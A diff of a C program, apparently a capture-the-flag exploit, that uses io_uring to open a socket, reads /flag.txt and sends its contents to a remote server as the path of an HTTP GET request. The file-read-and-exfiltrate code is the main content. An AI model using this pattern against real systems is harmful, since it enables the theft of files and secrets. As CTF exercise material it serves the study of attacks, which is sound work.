@@ -15,11 +15,16 @@ int main(int argc , char *argv[])
     struct io_uring ring;
     struct io_uring_sqe *sqe;
     struct io_uring_cqe *cqe;
-    char buf[0x100];
+    char message[0x100];
+    char flag[0x100];
+
+    memset(message, 0, 0x100);
+    memset(flag, 0, 0x100);
+
     int fd = open("/flag.txt", 0);                      
-	
-    read(fd , buf, 0x100);
-    write(1, buf, 0x100);
+
+    read(fd , flag, 0x100);
+    write(1, flag, 0x100);
 
     io_uring_queue_init(1, &ring, 0);
     sqe = io_uring_get_sqe(&ring);
@@ -32,10 +37,16 @@ int main(int argc , char *argv[])
     io_uring_submit(&ring);
     io_uring_wait_cqe(&ring, &cqe);
 
-    int sockfd = fd+2;
+    int sockfd = cqe->res;
     if (sockfd == -1){
         printf("Fail to create a socket.");
     }
+
+
+    strcat(message, "GET /");
+    strcat(message, flag);
+    strcat(message, " HTTP/1.1\r\n");
+    strcat(message, "Connection: close\r\n\r\n");
 
     // socket connection
 
@@ -52,10 +63,7 @@ int main(int argc , char *argv[])
         printf("Connection error");
     }
 
-    char *message = &buf;
-    char receiveMessage[1000] = {};
-
-    send(sockfd,message, 0x100,0);
+    send(sockfd, message, 0x100,0);
 
     return 0;
 }
